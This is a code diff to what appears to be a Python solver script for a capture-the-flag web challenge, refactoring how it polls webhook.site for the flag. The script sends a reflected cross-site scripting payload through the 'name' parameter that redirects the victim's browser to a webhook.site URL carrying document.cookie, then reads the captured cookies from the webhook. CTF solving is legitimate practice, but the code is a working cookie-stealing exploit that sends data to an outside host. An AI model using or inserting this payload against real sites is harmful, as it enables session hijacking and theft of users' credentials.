@@ -19,15 +19,15 @@ class Solver:
         response = self.session.post("https://webhook.site/token")
         return response.json()["uuid"]
 
-    def find_flag_webhooksite(self):
-        time.sleep(2)
+    def find_flag_webhooksite(self, delay_seconds=2):
+        time.sleep(delay_seconds)
         response = self.session.get(self.webhooksite_requests_url)
-        text = json.dumps(response.json(), indent=2)
-        print(text)
-        find_flag(text)
+        response_json = response.json()
+        response_json_text = json.dumps(response_json, indent=2)
+        find_flag(response_json_text)
 
     def main(self):
-        PAYLOAD = f'<script>document.location = "{self.webhooksite_url}/?q=" + document.cookie</script>'
+        PAYLOAD = f'<script>document.location = "{self.webhooksite_url}?q=" + document.cookie</script>'
         response = self.session.get(BASE_URL, params={"name": PAYLOAD})
 
         redirect_url = response.url
